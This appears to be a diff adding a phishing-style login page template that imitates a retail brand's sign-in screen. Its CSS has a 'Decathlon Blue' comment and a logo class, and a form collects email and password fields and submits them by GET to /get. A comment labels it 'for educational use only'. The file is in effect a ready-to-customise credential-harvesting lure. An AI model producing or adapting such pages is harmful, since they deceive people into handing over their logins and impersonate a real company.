@@ -1,0 +1,189 @@
+<!-- Stock website layout, find the text you want to change and change it to what you'd like. -->
+<!-- FOR EDUCATIONAL USE ONLY, DO NOT USE IN PUBLIC SPACES -->
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Login to your Webpage</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            list-style: none;
+            text-decoration: none;
+        }
+
+        body {
+            font-family: Roboto, Helvetica Neue, Helvetica, Arial, sans-serif;
+            color: #2b2b2b;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            padding: 15px;
+            background-color: #0082c3; /* Decathlon Blue */
+            display: flex;
+            justify-content: center;
+        }
+
+        .decathlon-logo {
+            font-weight: 900;
+            font-style: italic;
+            font-size: 28px;
+            color: #ffffff;
+            letter-spacing: 1px;
+        }
+
+        .main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        form {
+            width: 500px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        #sign h2 {
+            text-align: center;
+            margin: 5px auto 20px;
+            font-size: 24px;
+            font-weight: 700;
+            color: #0082c3;
+        }
+
+        #inputText {
+            margin: 5px 0 30px 0;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        #firstname {
+            min-width: 350px;
+            padding: 15px 20px;
+            border: 1px solid #d2d2d7;
+            border-radius: 4px;
+            border-bottom-left-radius: 0;
+            border-bottom-right-radius: 0;
+            align-self: center;
+            font-size: 16px;
+        }
+
+        #lastname {
+            min-width: 350px;
+            padding: 15px 20px;
+            border: 1px solid #d2d2d7;
+            border-top: none;
+            border-radius: 4px;
+            border-top-left-radius: 0;
+            border-top-right-radius: 0;
+            align-self: center;
+            font-size: 16px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0082c3;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .submit-btn {
+            background-color: #0082c3;
+            color: #ffffff;
+            border: none;
+            padding: 12px 40px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #006da3;
+        }
+
+        footer {
+            display: flex;
+            justify-content: center;
+            width: 100%;
+            padding: 20px;
+            background-color: #f5f5f7;
+            font-size: 13px;
+            color: #656569;
+        }
+
+        footer p {
+            margin: 0 10px;
+        }
+
+        @media screen and (max-width: 768px) {
+            form {
+                width: 100%;
+            }
+
+            #firstname,
+            #lastname {
+                min-width: 100%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="title-logo">
+            SITE TITLE
+        </div>
+    </header>
+
+    <div class="main">
+        <form action="/get" id="details-form" method="GET">
+            <div id="sign">
+                <h2>Welcome</h2>
+            </div>
+            <div class="input" id="inputText">
+                <div>
+                    <input type="text" name="email" placeholder="First Name/E-Mail" id="firstname" required>
+                </div>
+                <div>
+                    <input type="text" name="password" placeholder="Last Name/Password" id="lastname" required>
+                </div>
+            </div>
+            <div class="logo">
+                <button class="submit-btn" type="submit">
+                    Continue
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <footer>
+        <p>Copyright &copy 2026 *Brand*. All rights reserved.</p>
+        <p>Privacy Policy</p>
+        <p>Terms of Use</p>
+    </footer>
+</body>
+
+</html>
